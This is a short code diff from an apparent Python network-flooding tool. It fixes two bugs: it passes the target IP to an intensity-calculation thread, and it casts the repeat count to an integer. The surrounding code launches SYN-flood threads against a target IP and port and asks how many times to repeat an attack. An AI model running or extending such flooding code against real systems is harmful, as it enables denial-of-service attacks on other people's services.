@@ -79,7 +79,7 @@ def launch_attack(selection, target_ip, intensity=None, pps=None, time=None):
         else:
             port = random.randrange(1, 65536)   # 열린 포트 정보가 없다면 랜덤 지정
         
-        t1 = ThreadWithReturnValue(target=calc_flooding_intensity, args=(time,))
+        t1 = ThreadWithReturnValue(target=calc_flooding_intensity, args=(time,target_ip))
         t2 = threading.Thread(target=syn_flood, args=(target_ip, port, pps, count))
         t1.start()
         # starting thread 2
@@ -155,7 +155,7 @@ def run_type_A(target_ip: str):
         print('Good bye.')
         return False
 
-    ntimes = input('How many times to repeat the selected attack: ')
+    ntimes = int(input('How many times to repeat the selected attack: '))
     if ntimes > 1:
         sleep_time = input('What is the sleep time in sec between attacks?')
         sleep_time = int(sleep_time)
